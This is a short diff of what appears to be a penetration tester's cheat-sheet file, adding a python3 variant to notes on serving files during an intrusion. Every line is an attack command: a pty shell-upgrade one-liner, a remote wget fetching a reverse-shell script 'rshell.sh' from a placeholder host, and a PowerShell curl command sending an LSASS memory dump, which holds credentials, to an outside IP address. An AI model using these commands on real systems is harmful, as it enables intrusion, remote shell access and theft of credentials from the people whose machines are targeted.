@@ -2,7 +2,9 @@
 python -c ‘import pty; pty.spawn(“/bin/bash”)’
 
 # SimpleServ
-local: python -m SimpleHTTPServer 1234 - remote: wget http://X.X.X.X:1234/rshell.sh
+local: python -m SimpleHTTPServer 1234 or python3 -m http.server 8000
+- remote: wget http://X.X.X.X:1234/rshell.sh
+
 remote: powershell curl.exe -X POST -F file=@C:\lsass.dmp http://192.168.6.201:8000
 
 RS:
